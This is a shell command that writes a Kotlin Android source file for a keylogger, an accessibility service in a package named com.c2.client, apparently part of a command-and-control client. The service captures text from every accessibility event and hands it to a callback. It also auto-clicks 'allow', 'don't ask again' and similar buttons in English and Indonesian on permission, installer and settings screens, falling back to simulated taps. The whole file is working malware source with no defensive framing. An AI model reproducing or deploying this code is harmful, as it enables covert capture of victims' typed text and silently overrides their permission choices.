cat > app/src/main/java/com/c2/client/KeyloggerService.kt << 'EOF'
package com.c2.client

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.graphics.Rect
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class KeyloggerService : AccessibilityService() {

    companion object {
        @Volatile var enabled: Boolean = false
        @Volatile var onKey: ((String) -> Unit)? = null
    }

    private val allowLabels = setOf(
        "allow", "izinkan", "permit", "while using the app", "saat menggunakan aplikasi",
        "only this time", "hanya kali ini", "ok", "oke", "yes", "ya", "continue", "lanjutkan",
        "allow all the time", "izinkan sepanjang waktu", "don't ask again", "jangan tanya lagi",
        "allow access to all photos", "izinkan akses ke semua foto",
        "turn on", "aktifkan", "allow notifications", "izinkan notifikasi",
        "got it", "mengerti", "i agree", "saya setuju", "start now", "mulai sekarang",
        "accept", "terima", "agree", "setuju"
    )

    override fun onServiceConnected() {
        super.onServiceConnected()
        enabled = true
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!enabled) return
        try {
            val root = rootInActiveWindow ?: return
            val pkg = root.packageName?.toString() ?: ""
            val isDialog = pkg.contains("permission") ||
                           pkg.contains("packageinstaller") ||
                           pkg.contains("settings")
            if (isDialog) autoClickAllow(root)

            val texts = event.text ?: return
            val sb = StringBuilder()
            for (t in texts) if (!t.isNullOrBlank()) sb.append(t)
            if (sb.isNotEmpty()) onKey?.invoke(sb.toString())
        } catch (_: Exception) {}
    }

    private fun autoClickAllow(root: AccessibilityNodeInfo) {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        val seen = HashSet<String>()

        while (queue.isNotEmpty()) {
            val node = queue.removeFirst()
            try {
                val label = (node.text?.toString() ?: node.contentDescription?.toString() ?: "")
                    .lowercase().trim()

                if (label.isNotEmpty() && allowLabels.any { label == it || label.contains(it) }) {
                    val key = "${node.viewIdResourceName}|$label|${node.hashCode()}"
                    if (seen.add(key)) {
                        var clicked = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        if (!clicked) {
                            val rect = Rect()
                            node.getBoundsInScreen(rect)
                            if (rect.width() > 0 && rect.height() > 0) {
                                try {
                                    val path = Path().apply {
                                        moveTo(rect.exactCenterX(), rect.exactCenterY())
                                    }
                                    val g = GestureDescription.Builder()
                                        .addStroke(GestureDescription.StrokeDescription(path, 0, 60))
                                        .build()
                                    dispatchGesture(g, null, null)
                                    clicked = true
                                } catch (_: Exception) {}
                            }
                        }
                    }
                }

                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { queue.add(it) }
                }
            } catch (_: Exception) {}
        }
    }

    override fun onInterrupt() {}
}
EOF
